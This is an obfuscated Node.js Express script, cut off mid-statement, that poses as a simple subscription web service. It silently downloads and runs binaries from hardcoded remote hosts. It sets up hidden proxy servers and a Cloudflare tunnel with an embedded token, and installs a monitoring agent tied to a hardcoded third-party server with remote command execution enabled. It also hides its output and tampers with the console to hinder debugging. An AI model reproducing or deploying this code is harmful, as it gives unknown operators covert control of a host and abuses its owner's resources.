const _0x2645ee=_0x174d;(function(_0x56c844,_0x4c6503){const _0x50d06d=_0x174d,_0x253373=_0x56c844();while(!![]){try{const _0x370c9f=-parseInt(_0x50d06d(0x1bd))/0x1*(parseInt(_0x50d06d(0x1a5))/0x2)+parseInt(_0x50d06d(0x1ee))/0x3+-parseInt(_0x50d06d(0x1d0))/0x4+-parseInt(_0x50d06d(0x1a3))/0x5+parseInt(_0x50d06d(0x1c0))/0x6*(-parseInt(_0x50d06d(0x1b2))/0x7)+-parseInt(_0x50d06d(0x176))/0x8*(parseInt(_0x50d06d(0x174))/0x9)+parseInt(_0x50d06d(0x188))/0xa;if(_0x370c9f===_0x4c6503)break;else _0x253373['push'](_0x253373['shift']());}catch(_0x8953b8){_0x253373['push'](_0x253373['shift']());}}}(_0x3e17,0x48018));const _0x4bd7f3=(function(){let _0x5c6e5c=!![];return function(_0x933166,_0x4b4648){const _0x32d293=_0x5c6e5c?function(){if(_0x4b4648){const _0x3b691=_0x4b4648['apply'](_0x933166,arguments);return _0x4b4648=null,_0x3b691;}}:function(){};return _0x5c6e5c=![],_0x32d293;};}()),_0x5ea9cb=_0x4bd7f3(this,function(){const _0x1ecaa9=_0x174d;return _0x5ea9cb[_0x1ecaa9(0x1f0)]()['search']('(((.+)+)+)+$')[_0x1ecaa9(0x1f0)]()[_0x1ecaa9(0x1c7)](_0x5ea9cb)[_0x1ecaa9(0x208)]('(((.+)+)+)+$');});function _0x3e17(){const _0x38952a=['message','SUB_PATH','/api/add-nodes','status','from','mkdirSync','log','\x20>/dev/null\x202>&1','/tunnel.yml\x20run','true','https://arm64.ssss.nyc.mn/agent','NEZHA_KEY','Error\x20executing\x20command:\x20','utf8','2083','&fp=firefox&type=ws&host=','split','Download\x20','none','false','8443','.exe\x20>\x20nul\x202>&1','match','\x0a\x20\x20credentials-file:\x20','2642790lpcEIi','\x20already\x20exists','1604VctFEz','\x20-c\x20','\x22\x20>\x20/dev/null\x202>&1','sub.txt','express','http\x20server\x20is\x20running\x20on\x20port:','includes','nohup\x20','unshift','arm64','util','CFIP','platform','165557KhZKfZ','Unhandled\x20error\x20in\x20startserver:','https://amd64.ssss.nyc.mn/v1','env','warn','rm\x20-rf\x20','\x20is\x20running','Error\x20in\x20startserver:','/vless-argo','ArgoDomain:','\x20successfully','98xBQszK','http://ip-api.com/json','apply','96eJvnGB','child_process','aarch64','/vmess-argo','stringify','win32','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','constructor','get','/config.json\x20>/dev/null\x202>&1\x20&','country_code','tunnel.json','/dev/null','test','readFile','UUID','9056zMaVKn','firefox','?security=tls&sni=','NEZHA_SERVER','Content-Type','gla.900809.xyz','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','forEach','all','arm','bind','Error\x20reading\x20boot.log:','https://amd64.ssss.nyc.mn/web','AUTO_ACCESS','PORT','countryCode','unlinkSync','Skipping\x20adding\x20automatic\x20access\x20task','vmess','amd','\x20failed:\x20','console','floor','ARGO_PORT','utf-8','{}.constructor(\x22return\x20this\x22)(\x20)','taskkill\x20/f\x20/im\x20','670080yhwEHZ','basename','toString','127.0.0.1','TunnelSecret','error','config.json','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','197c869d-cf8f-4547-95fe-e38dd26525d8','/trojan-argo','filter','prototype','Add\x20automatic\x20access\x20task\x20faild:\x20','writeFileSync','trojan','Galaxy','Empowerment\x20success\x20for\x20','createWriteStream','promises','response','php\x20running\x20error:\x20','tcp','arch','direct','finish','http','search','\x20>\x20nul\x202>&1','boot.log','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','SERVER_PORT','length','443','application/json','readFileSync','del\x20/f\x20/q\x20','automatic\x20access\x20task\x20added\x20successfully','vless','random','list.txt','existsSync','join','xujq','quic','web\x20running\x20error:\x20','push','fileUrl','xtls-rprx-vision','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','eyJhIjoiMTZjZjVkMzQwODQ2YmU1MDNlYWQzNjY2NTI4MDczNTMiLCJ0IjoiMTI3ZjZhYWQtODlkZi00Mzk1LWI2OWEtNTgwYTE3YTdiYTczIiwicyI6Ik9HWmlNRFZqWTJNdFlUYzFNUzAwWVdNekxXSm1NbVF0TWpRME16ZGhPVEJoWW1KaSJ9','info','table','path','FILE_PATH','data','Subscription\x20uploaded\x20successfully','charAt','\x0aclient_secret:\x20','--tls','pkill\x20-f\x20\x22[','\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20','substring','isFile','exception','statSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','App\x20is\x20running','freedom','\x0a\x20\x20tunnel:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','index.html','tunnel.yml','fileName','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Nodes\x20uploaded\x20successfully','677871rptPsA','send','8zOLRbZ','base64','/vmess-argo?ed=2560','/api/delete-nodes','map','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','2096','chmod','then','org','\x20-p\x20','pipe','2087','catch','https://amd64.ssss.nyc.mn/agent','blackhole','set','post','11347290RDwfoo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22'];_0x3e17=function(){return _0x38952a;};return _0x3e17();}_0x5ea9cb();const _0x4725b4=(function(){let _0x4ce57c=!![];return function(_0x126a9a,_0x26e237){const _0x20525a=_0x4ce57c?function(){const _0x20932a=_0x174d;if(_0x26e237){const _0x2dfda3=_0x26e237[_0x20932a(0x1bf)](_0x126a9a,arguments);return _0x26e237=null,_0x2dfda3;}}:function(){};return _0x4ce57c=![],_0x20525a;};}()),_0x458dd5=_0x4725b4(this,function(){const _0x827d57=_0x174d;let _0x4e3fd1;try{const _0x44f2ba=Function('return\x20(function()\x20'+_0x827d57(0x1ec)+');');_0x4e3fd1=_0x44f2ba();}catch(_0x5a6a92){_0x4e3fd1=window;}const _0x46181e=_0x4e3fd1[_0x827d57(0x1e8)]=_0x4e3fd1[_0x827d57(0x1e8)]||{},_0x1be7a2=[_0x827d57(0x191),_0x827d57(0x1b6),_0x827d57(0x159),_0x827d57(0x1f3),_0x827d57(0x168),_0x827d57(0x15a),'trace'];for(let _0x3097d4=0x0;_0x3097d4<_0x1be7a2[_0x827d57(0x20d)];_0x3097d4++){const _0x5738ab=_0x4725b4['constructor'][_0x827d57(0x1f9)][_0x827d57(0x1dd)](_0x4725b4),_0x1a7fe1=_0x1be7a2[_0x3097d4],_0x53748b=_0x46181e[_0x1a7fe1]||_0x5738ab;_0x5738ab['__proto__']=_0x4725b4[_0x827d57(0x1dd)](_0x4725b4),_0x5738ab[_0x827d57(0x1f0)]=_0x53748b['toString'][_0x827d57(0x1dd)](_0x53748b),_0x46181e[_0x1a7fe1]=_0x5738ab;}});_0x458dd5();const express=require(_0x2645ee(0x1a9)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x2645ee(0x15b)),{promisify}=require(_0x2645ee(0x1af)),exec=promisify(require(_0x2645ee(0x1c1))['exec']),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x2645ee(0x1b5)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2645ee(0x1b5)][_0x2645ee(0x1e0)]||![],FILE_PATH=process[_0x2645ee(0x1b5)][_0x2645ee(0x15c)]||'.tmp',SUB_PATH=process[_0x2645ee(0x1b5)][_0x2645ee(0x18c)]||_0x2645ee(0x218),PORT=process['env'][_0x2645ee(0x20c)]||process[_0x2645ee(0x1b5)][_0x2645ee(0x1e1)]||0xbb8,UUID=process['env'][_0x2645ee(0x1cf)]||_0x2645ee(0x1f6),NEZHA_SERVER=process[_0x2645ee(0x1b5)][_0x2645ee(0x1d3)]||'komari.900809.xyz',NEZHA_PORT=process[_0x2645ee(0x1b5)]['NEZHA_PORT']||'443',NEZHA_KEY=process[_0x2645ee(0x1b5)][_0x2645ee(0x196)]||'Wvv1i5m9wuSYDAYZBwOjsw',ARGO_DOMAIN=process[_0x2645ee(0x1b5)]['ARGO_DOMAIN']||_0x2645ee(0x1d5),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2645ee(0x158),ARGO_PORT=process[_0x2645ee(0x1b5)][_0x2645ee(0x1ea)]||0x1f41,CFIP=process['env'][_0x2645ee(0x1b0)]||'cdns.doon.eu.org',CFPORT=process[_0x2645ee(0x1b5)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||_0x2645ee(0x1fd);!fs[_0x2645ee(0x216)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2645ee(0x191)](FILE_PATH+'\x20is\x20created')):console[_0x2645ee(0x191)](FILE_PATH+_0x2645ee(0x1a4));function generateRandomName(){const _0x366f27=_0x2645ee,_0x42f0ca='abcdefghijklmnopqrstuvwxyz';let _0x5189ce='';for(let _0x2ad30f=0x0;_0x2ad30f<0x6;_0x2ad30f++){_0x5189ce+=_0x42f0ca[_0x366f27(0x15f)](Math[_0x366f27(0x1e9)](Math[_0x366f27(0x214)]()*_0x42f0ca[_0x366f27(0x20d)]));}return _0x5189ce;}function _0x174d(_0x2a4e69,_0x390e0a){const _0x175e93=_0x3e17();return _0x174d=function(_0x458dd5,_0x4725b4){_0x458dd5=_0x458dd5-0x158;let _0x1ee1bd=_0x175e93[_0x458dd5];return _0x1ee1bd;},_0x174d(_0x2a4e69,_0x390e0a);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2645ee(0x217)](FILE_PATH,npmName),phpPath=path[_0x2645ee(0x217)](FILE_PATH,phpName),webPath=path[_0x2645ee(0x217)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2645ee(0x1a8)),listPath=path[_0x2645ee(0x217)](FILE_PATH,_0x2645ee(0x215)),bootLogPath=path[_0x2645ee(0x217)](FILE_PATH,'boot.log'),configPath=path[_0x2645ee(0x217)](FILE_PATH,'config.json');function deleteNodes(){const _0x90b750=_0x2645ee;try{if(!UPLOAD_URL)return;if(!fs[_0x90b750(0x216)](subPath))return;let _0x2a4a7c;try{_0x2a4a7c=fs[_0x90b750(0x210)](subPath,_0x90b750(0x1eb));}catch{return null;}const _0x27998a=Buffer['from'](_0x2a4a7c,_0x90b750(0x177))['toString']('utf-8'),_0x48a8ce=_0x27998a[_0x90b750(0x19b)]('\x0a')['filter'](_0x3b0827=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x90b750(0x1cd)](_0x3b0827));if(_0x48a8ce[_0x90b750(0x20d)]===0x0)return;return axios[_0x90b750(0x187)](UPLOAD_URL+_0x90b750(0x179),JSON[_0x90b750(0x1c4)]({'nodes':_0x48a8ce}),{'headers':{'Content-Type':_0x90b750(0x20f)}})['catch'](_0x193785=>{return null;}),null;}catch(_0x4bfbed){return null;}}function cleanupOldFiles(){const _0x1be007=_0x2645ee;try{const _0x1c5afb=fs['readdirSync'](FILE_PATH);_0x1c5afb[_0x1be007(0x1da)](_0x5b53a6=>{const _0x3afb7f=_0x1be007,_0x53b4bb=path[_0x3afb7f(0x217)](FILE_PATH,_0x5b53a6);try{const _0x4180c7=fs[_0x3afb7f(0x169)](_0x53b4bb);_0x4180c7[_0x3afb7f(0x167)]()&&fs['unlinkSync'](_0x53b4bb);}catch(_0xcd1be2){}});}catch(_0x5ea3d1){}}async function generateConfig(){const _0x3ba50e=_0x2645ee,_0x478061={'log':{'access':'/dev/null','error':_0x3ba50e(0x1cc),'loglevel':_0x3ba50e(0x19d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3ba50e(0x213),'settings':{'clients':[{'id':UUID,'flow':_0x3ba50e(0x21d)}],'decryption':_0x3ba50e(0x19d),'fallbacks':[{'dest':0xbb9},{'path':_0x3ba50e(0x1ba),'dest':0xbba},{'path':_0x3ba50e(0x1c3),'dest':0xbbb},{'path':_0x3ba50e(0x1f7),'dest':0xbbc}]},'streamSettings':{'network':_0x3ba50e(0x203)}},{'port':0xbb9,'listen':_0x3ba50e(0x1f1),'protocol':_0x3ba50e(0x213),'settings':{'clients':[{'id':UUID}],'decryption':_0x3ba50e(0x19d)},'streamSettings':{'network':'tcp','security':_0x3ba50e(0x19d)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3ba50e(0x213),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3ba50e(0x19d)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3ba50e(0x1ba)}},'sniffing':{'enabled':!![],'destOverride':[_0x3ba50e(0x207),_0x3ba50e(0x1d6),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3ba50e(0x1f1),'protocol':_0x3ba50e(0x1e5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3ba50e(0x1c3)}},'sniffing':{'enabled':!![],'destOverride':[_0x3ba50e(0x207),_0x3ba50e(0x1d6),_0x3ba50e(0x219)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3ba50e(0x1fc),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3ba50e(0x19d),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3ba50e(0x1d6),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x3ba50e(0x16c),'tag':_0x3ba50e(0x205)},{'protocol':_0x3ba50e(0x185),'tag':'block'}]};fs[_0x3ba50e(0x1fb)](path[_0x3ba50e(0x217)](FILE_PATH,_0x3ba50e(0x1f4)),JSON[_0x3ba50e(0x1c4)](_0x478061,null,0x2));}function getSystemArchitecture(){const _0x28b1ea=_0x2645ee,_0x1a0f51=os[_0x28b1ea(0x204)]();return _0x1a0f51===_0x28b1ea(0x1dc)||_0x1a0f51===_0x28b1ea(0x1ae)||_0x1a0f51===_0x28b1ea(0x1c2)?_0x28b1ea(0x1dc):_0x28b1ea(0x1e6);}function downloadFile(_0x53edd9,_0x4d9567,_0xc9ceef){const _0x355b47=_0x2645ee,_0x55f81b=_0x53edd9;!fs[_0x355b47(0x216)](FILE_PATH)&&fs[_0x355b47(0x190)](FILE_PATH,{'recursive':!![]});const _0x54c435=fs[_0x355b47(0x1ff)](_0x55f81b);axios({'method':_0x355b47(0x1c8),'url':_0x4d9567,'responseType':'stream'})[_0x355b47(0x17e)](_0x533641=>{const _0x35ac76=_0x355b47;_0x533641[_0x35ac76(0x15d)][_0x35ac76(0x181)](_0x54c435),_0x54c435['on'](_0x35ac76(0x206),()=>{const _0x40cc52=_0x35ac76;_0x54c435['close'](),console[_0x40cc52(0x191)](_0x40cc52(0x19c)+path[_0x40cc52(0x1ef)](_0x55f81b)+_0x40cc52(0x1bc)),_0xc9ceef(null,_0x55f81b);}),_0x54c435['on'](_0x35ac76(0x1f3),_0x8447b9=>{const _0x3c349c=_0x35ac76;fs['unlink'](_0x55f81b,()=>{});const _0xc1a2af='Download\x20'+path[_0x3c349c(0x1ef)](_0x55f81b)+'\x20failed:\x20'+_0x8447b9[_0x3c349c(0x18b)];console[_0x3c349c(0x1f3)](_0xc1a2af),_0xc9ceef(_0xc1a2af);});})[_0x355b47(0x183)](_0x4eb6a0=>{const _0x169e6c=_0x355b47,_0x498f05=_0x169e6c(0x19c)+path[_0x169e6c(0x1ef)](_0x55f81b)+_0x169e6c(0x1e7)+_0x4eb6a0[_0x169e6c(0x18b)];console['error'](_0x498f05),_0xc9ceef(_0x498f05);});}async function downloadFilesAndRun(){const _0x2791e6=_0x2645ee,_0xda4ea5=getSystemArchitecture(),_0x5a2c24=getFilesForArchitecture(_0xda4ea5);if(_0x5a2c24[_0x2791e6(0x20d)]===0x0){console[_0x2791e6(0x191)](_0x2791e6(0x1d7));return;}const _0x11048a=_0x5a2c24[_0x2791e6(0x17a)](_0x22b43e=>{return new Promise((_0x2d42ac,_0x4cba38)=>{const _0x1699e0=_0x174d;downloadFile(_0x22b43e[_0x1699e0(0x171)],_0x22b43e[_0x1699e0(0x21c)],(_0x2671f4,_0x583db3)=>{_0x2671f4?_0x4cba38(_0x2671f4):_0x2d42ac(_0x583db3);});});});try{await Promise[_0x2791e6(0x1db)](_0x11048a);}catch(_0x5e4658){console['error']('Error\x20downloading\x20files:',_0x5e4658);return;}function _0x1f72a5(_0x339430){const _0x5e9417=_0x2791e6,_0x41b0a1=0x1fd;_0x339430[_0x5e9417(0x1da)](_0x7a8a45=>{const _0x19494f=_0x5e9417;fs[_0x19494f(0x216)](_0x7a8a45)&&fs[_0x19494f(0x17d)](_0x7a8a45,_0x41b0a1,_0x594472=>{const _0x91aef4=_0x19494f;_0x594472?console['error']('Empowerment\x20failed\x20for\x20'+_0x7a8a45+':\x20'+_0x594472):console[_0x91aef4(0x191)](_0x91aef4(0x1fe)+_0x7a8a45+':\x20'+_0x41b0a1[_0x91aef4(0x1f0)](0x8));});});}const _0x51a8e9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1f72a5(_0x51a8e9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1b130d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2791e6(0x19b)](':')['pop']():'',_0xee0b30=new Set([_0x2791e6(0x20e),_0x2791e6(0x19f),_0x2791e6(0x17c),_0x2791e6(0x182),'2083',_0x2791e6(0x1d8)]),_0x152586=_0xee0b30['has'](_0x1b130d)?_0x2791e6(0x194):_0x2791e6(0x19e),_0x592812=_0x2791e6(0x160)+NEZHA_KEY+_0x2791e6(0x1c6)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x152586+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x2791e6(0x217)](FILE_PATH,'config.yaml'),_0x592812);const _0x7aacc3='nohup\x20'+phpPath+_0x2791e6(0x18a)+FILE_PATH+_0x2791e6(0x189);try{await exec(_0x7aacc3),console['log'](phpName+_0x2791e6(0x1b8)),await new Promise(_0x195661=>setTimeout(_0x195661,0x3e8));}catch(_0x3052d3){console[_0x2791e6(0x1f3)](_0x2791e6(0x202)+_0x3052d3);}}else{let _0x2c12b8='';const _0x5c4989=[_0x2791e6(0x20e),'8443','2096','2087',_0x2791e6(0x199),_0x2791e6(0x1d8)];_0x5c4989['includes'](NEZHA_PORT)&&(_0x2c12b8=_0x2791e6(0x161));const _0x36d779=_0x2791e6(0x1ac)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2791e6(0x180)+NEZHA_KEY+'\x20'+_0x2c12b8+_0x2791e6(0x1f5);try{await exec(_0x36d779),console[_0x2791e6(0x191)](npmName+'\x20is\x20running'),await new Promise(_0x3a6b10=>setTimeout(_0x3a6b10,0x3e8));}catch(_0x2c37da){console[_0x2791e6(0x1f3)]('npm\x20running\x20error:\x20'+_0x2c37da);}}}else console[_0x2791e6(0x191)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x211758=_0x2791e6(0x1ac)+webPath+_0x2791e6(0x1a6)+FILE_PATH+_0x2791e6(0x1c9);try{await exec(_0x211758),console[_0x2791e6(0x191)](webName+_0x2791e6(0x1b8)),await new Promise(_0x4a3608=>setTimeout(_0x4a3608,0x3e8));}catch(_0x406d76){console['error'](_0x2791e6(0x21a)+_0x406d76);}if(fs['existsSync'](botPath)){let _0x21b9d3;if(ARGO_AUTH[_0x2791e6(0x1a1)](/^[A-Z0-9a-z=]{120,250}$/))_0x21b9d3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x21b9d3='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2791e6(0x193):_0x21b9d3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2791e6(0x1ac)+botPath+'\x20'+_0x21b9d3+'\x20>/dev/null\x202>&1\x20&'),console[_0x2791e6(0x191)](botName+'\x20is\x20running'),await new Promise(_0x1c62c7=>setTimeout(_0x1c62c7,0x7d0));}catch(_0x16e6c8){console[_0x2791e6(0x1f3)](_0x2791e6(0x197)+_0x16e6c8);}}await new Promise(_0x160fc2=>setTimeout(_0x160fc2,0x1388));}function getFilesForArchitecture(_0x4519d2){const _0x4cb52a=_0x2645ee;let _0x248280;_0x4519d2===_0x4cb52a(0x1dc)?_0x248280=[{'fileName':webPath,'fileUrl':_0x4cb52a(0x164)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x248280=[{'fileName':webPath,'fileUrl':_0x4cb52a(0x1df)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x34417e=_0x4519d2===_0x4cb52a(0x1dc)?_0x4cb52a(0x195):_0x4cb52a(0x184);_0x248280[_0x4cb52a(0x1ad)]({'fileName':npmPath,'fileUrl':_0x34417e});}else{const _0x2c1c2d=_0x4519d2===_0x4cb52a(0x1dc)?'https://arm64.ssss.nyc.mn/v1':_0x4cb52a(0x1b4);_0x248280[_0x4cb52a(0x1ad)]({'fileName':phpPath,'fileUrl':_0x2c1c2d});}}return _0x248280;}function argoType(){const _0x24f7f4=_0x2645ee;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x24f7f4(0x191)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x24f7f4(0x1ab)](_0x24f7f4(0x1f2))){fs[_0x24f7f4(0x1fb)](path['join'](FILE_PATH,_0x24f7f4(0x1cb)),ARGO_AUTH);const _0x26e654=_0x24f7f4(0x16d)+ARGO_AUTH[_0x24f7f4(0x19b)]('\x22')[0xb]+_0x24f7f4(0x1a2)+path['join'](FILE_PATH,'tunnel.json')+_0x24f7f4(0x16a)+ARGO_DOMAIN+_0x24f7f4(0x20b)+ARGO_PORT+_0x24f7f4(0x1d9);fs['writeFileSync'](path[_0x24f7f4(0x217)](FILE_PATH,_0x24f7f4(0x170)),_0x26e654);}else console[_0x24f7f4(0x191)](_0x24f7f4(0x21e));}async function extractDomains(){const _0x350dbf=_0x2645ee;let _0x142d9b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x142d9b=ARGO_DOMAIN,console[_0x350dbf(0x191)]('ARGO_DOMAIN:',_0x142d9b),await _0x17d59f(_0x142d9b);else try{const _0x8635c8=fs['readFileSync'](path[_0x350dbf(0x217)](FILE_PATH,_0x350dbf(0x20a)),_0x350dbf(0x1eb)),_0x59edb7=_0x8635c8[_0x350dbf(0x19b)]('\x0a'),_0xbf7bae=[];_0x59edb7[_0x350dbf(0x1da)](_0x2f4bec=>{const _0x46ef9f=_0x350dbf,_0x96bfce=_0x2f4bec['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x96bfce){const _0x4c086d=_0x96bfce[0x1];_0xbf7bae[_0x46ef9f(0x21b)](_0x4c086d);}});if(_0xbf7bae[_0x350dbf(0x20d)]>0x0)_0x142d9b=_0xbf7bae[0x0],console[_0x350dbf(0x191)](_0x350dbf(0x1bb),_0x142d9b),await _0x17d59f(_0x142d9b);else{console[_0x350dbf(0x191)](_0x350dbf(0x172)),fs[_0x350dbf(0x1e3)](path['join'](FILE_PATH,_0x350dbf(0x20a)));async function _0x2c6af8(){const _0x2560c7=_0x350dbf;try{process[_0x2560c7(0x1b1)]==='win32'?await exec(_0x2560c7(0x1ed)+botName+_0x2560c7(0x1a0)):await exec(_0x2560c7(0x162)+botName[_0x2560c7(0x15f)](0x0)+']'+botName[_0x2560c7(0x166)](0x1)+_0x2560c7(0x1a7));}catch(_0x3422a4){}}_0x2c6af8(),await new Promise(_0x423ad9=>setTimeout(_0x423ad9,0xbb8));const _0xca56dc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x350dbf(0x1ac)+botPath+'\x20'+_0xca56dc+_0x350dbf(0x163)),console[_0x350dbf(0x191)](botName+_0x350dbf(0x1b8)),await new Promise(_0x1d1530=>setTimeout(_0x1d1530,0xbb8)),await extractDomains();}catch(_0x14582e){console[_0x350dbf(0x1f3)]('Error\x20executing\x20command:\x20'+_0x14582e);}}}catch(_0x47920d){console[_0x350dbf(0x1f3)](_0x350dbf(0x1de),_0x47920d);}async function _0x456606(){const _0x43d8d4=_0x350dbf;try{const _0x1f68b9=await axios[_0x43d8d4(0x1c8)]('https://ipapi.co/json',{'timeout':0xbb8});if(_0x1f68b9[_0x43d8d4(0x15d)]&&_0x1f68b9[_0x43d8d4(0x15d)]['country_code']&&_0x1f68b9[_0x43d8d4(0x15d)]['org'])return _0x1f68b9[_0x43d8d4(0x15d)][_0x43d8d4(0x1ca)]+'_'+_0x1f68b9[_0x43d8d4(0x15d)][_0x43d8d4(0x17f)];}catch(_0x25c385){try{const _0x16876f=await axios['get'](_0x43d8d4(0x1be),{'timeout':0xbb8});if(_0x16876f[_0x43d8d4(0x15d)]&&_0x16876f['data'][_0x43d8d4(0x18e)]==='success'&&_0x16876f[_0x43d8d4(0x15d)][_0x43d8d4(0x1e2)]&&_0x16876f[_0x43d8d4(0x15d)][_0x43d8d4(0x17f)])return _0x16876f[_0x43d8d4(0x15d)][_0x43d8d4(0x1e2)]+'_'+_0x16876f[_0x43d8d4(0x15d)][_0x43d8d4(0x17f)];}catch(_0x6de6a3){}}return'Unknown';}async function _0x17d59f(_0x2d9a40){const _0xdac802=await _0x456606(),_0x29cc58=NAME?NAME+'-'+_0xdac802:_0xdac802;return new Promise(_0x51154e=>{setTimeout(()=>{const _0xcea881=_0x174d,_0x2423fd={'v':'2','ps':''+_0x29cc58,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xcea881(0x19d),'net':'ws','type':_0xcea881(0x19d),'host':_0x2d9a40,'path':_0xcea881(0x178),'tls':_0xcea881(0x1d6),'sni':_0x2d9a40,'alpn':'','fp':_0xcea881(0x1d1)},_0x4eb35a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2d9a40+_0xcea881(0x19a)+_0x2d9a40+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x29cc58+'\x0a\x0avmess://'+Buffer[_0xcea881(0x18f)](JSON[_0xcea881(0x1c4)](_0x2423fd))[_0xcea881(0x1f0)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xcea881(0x1d2)+_0x2d9a40+_0xcea881(0x19a)+_0x2d9a40+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x29cc58+_0xcea881(0x165);console[_0xcea881(0x191)](Buffer[_0xcea881(0x18f)](_0x4eb35a)[_0xcea881(0x1f0)](_0xcea881(0x177))),fs['writeFileSync'](subPath,Buffer['from'](_0x4eb35a)['toString'](_0xcea881(0x177))),console[_0xcea881(0x191)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xcea881(0x1c8)]('/'+SUB_PATH,(_0x1e47b0,_0x5eeb4f)=>{const _0x4cfcaa=_0xcea881,_0xd9c075=Buffer[_0x4cfcaa(0x18f)](_0x4eb35a)[_0x4cfcaa(0x1f0)](_0x4cfcaa(0x177));_0x5eeb4f[_0x4cfcaa(0x186)](_0x4cfcaa(0x1d4),'text/plain;\x20charset=utf-8'),_0x5eeb4f['send'](_0xd9c075);}),_0x51154e(_0x4eb35a);},0x7d0);});}}async function uploadNodes(){const _0x169832=_0x2645ee;if(UPLOAD_URL&&PROJECT_URL){const _0x456769=PROJECT_URL+'/'+SUB_PATH,_0x23093c={'subscription':[_0x456769]};try{const _0x75bd0d=await axios[_0x169832(0x187)](UPLOAD_URL+'/api/add-subscriptions',_0x23093c,{'headers':{'Content-Type':_0x169832(0x20f)}});return _0x75bd0d&&_0x75bd0d[_0x169832(0x18e)]===0xc8?(console[_0x169832(0x191)](_0x169832(0x15e)),_0x75bd0d):null;}catch(_0x536e5a){if(_0x536e5a[_0x169832(0x201)]){if(_0x536e5a[_0x169832(0x201)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const 